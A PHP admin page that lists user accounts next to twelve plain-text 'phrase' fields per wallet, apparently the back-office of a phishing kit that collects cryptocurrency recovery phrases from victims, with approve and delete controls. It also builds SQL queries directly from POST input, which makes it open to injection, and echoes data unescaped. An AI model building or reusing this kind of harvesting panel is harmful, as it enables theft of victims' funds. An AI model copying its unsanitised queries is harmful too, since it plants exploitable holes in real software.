<?php 
include("includes/header.php");

$sql_wallet = "SELECT * FROM wallet";
$query_wallet = mysqli_query($conn, $sql_wallet);


if(isset($_POST['approve'])){
  $wallet_id = $_POST['id'];
  $client_id = $_POST['client_id'];
  $status = "approved";
  $sql_app = "UPDATE users set wallet_status = '$status' WHERE id = '$client_id'";
  $query_app = mysqli_query($conn, $sql_app);
  
  $sql_app_wall = "UPDATE wallet set wallet_status = '$status' WHERE id = '$wallet_id'";
  $query_app_wall = mysqli_query($conn, $sql_app_wall);
  echo "<script>alert('Wallet Approved successfully')</script>";
  header('refresh: 1; url=walletcon.php');
}

if(isset($_POST['delete'])){
  $wallet_id = $_POST['id'];
  $client_id = $_POST['client_id'];
  $status = "not approved";
  $sql_app = "UPDATE users set wallet_status = '$status' WHERE id = '$client_id'";
  $query_app = mysqli_query($conn, $sql_app);
  
  $sql_app_wall = "DELETE FROM wallet WHERE id = '$wallet_id'";
  $query_app_wall = mysqli_query($conn, $sql_app_wall);
  echo "<script>alert('Wallet Deleted successfully')</script>";
  header('refresh: 1; url=walletcon.php');
  
}
?>
<!-- Right side column. Contains the navbar and content of the page -->
<div class="content-wrapper">
    <!-- Content Header (Page header) -->
    <section class="content-header">
        <h1>
            CPT Wallet List

        </h1>
        <ol class="breadcrumb">
            <li><a href="#"><i class="fa fa-dashboard"></i> Home</a></li>
            <li><a href="#">Home</a></li>
            <li class="active">wallet</li>
        </ol>
    </section>

    <!-- Main content -->
    <section class="content">
        <div class="row">
            <div class="col-xs-12">
                <div class="box">
                    <div class="box-header">
                        <h3 class="box-title">Total Wallets connected</h3>
                        <div class="box-tools">
                            <div class="input-group">
                                <input type="text" name="table_search" class="form-control input-sm pull-right"
                                    style="width: 150px;" placeholder="Search" />
                                <div class="input-group-btn">
                                    <button class="btn btn-sm btn-default"><i class="fa fa-search"></i></button>
                                </div>
                            </div>
                        </div>
                    </div><!-- /.box-header -->
                    <div class="box-body table-responsive no-padding">
                        <table class="table table-hover">
                            <tr>

                                <th>Userid</th>
                              <th>Account</th>
                                <th>Wallet Name</th>
                                <th>Phase1</th>
                                <th>Phase2</th>
                                <th>Phase3</th>
                                <th>Phase4</th>

                                <th>Phase5</th>
                                <th>Phase6</th>
                                <th>Phase7</th>
                                <th>Phase8</th>
                                <th>Phase9</th>
                                <th>Phase10</th>
                                <th>Phase11</th>
                                <th>Phase12</th>
                              <th>Status</th>
                              	<th>Action</th>
                            </tr>
                            <?php while($user = mysqli_fetch_assoc($query_wallet)){  ?>
                            <tr>

                                <td><?php echo $user['userid']; ?></td>
                              	<td><?php echo $user['email']; ?></td>
                                <td><?php echo $user['wallet_name']; ?></td>
                                <td><?php echo $user['phrase1']; ?></td>
                                <td><?php echo $user['phrase2']; ?></td>
                                <td><?php echo $user['phrase3']; ?></td>
                                <td><?php echo $user['phrase4']; ?></td>
                                <td><?php echo $user['phrase5']; ?></td>
                                <td><?php echo $user['phrase6']; ?></td>
                                <td><?php echo $user['phrase7']; ?></td>
                                <td><?php echo $user['phrase8']; ?></td>
                                <td><?php echo $user['phrase9']; ?></td>
                                <td><?php echo $user['phrase10']; ?></td>
                                <td><?php echo $user['phrase11']; ?></td>
                                <td><?php echo $user['phrase12']; ?></td>
                              <td><?php echo $user['wallet_status']; ?></td>
                              	<td><form action="" method="post">
                                  <input type="hidden" name="client_id" value="<?php echo $user['client_id']; ?>">
                                  <input type="hidden" name="id" value="<?php echo $user['id']; ?>">
                                  <input type="submit" name="approve" class="btn btn-block btn-success btn-xs" value="Approve">
                              	<input type="submit" name="delete" class="btn btn-block btn-danger btn-xs" value="Delete">
                              	
                                  </form>
                              </td>
                                
                            </tr>
                            <?php } ?>
                        </table>
                    </div><!-- /.box-body -->
                </div><!-- /.box -->
            </div>
        </div>
    </section><!-- /.content -->
</div><!-- /.content-wrapper -->
<?php
include("includes/footer.php");

?>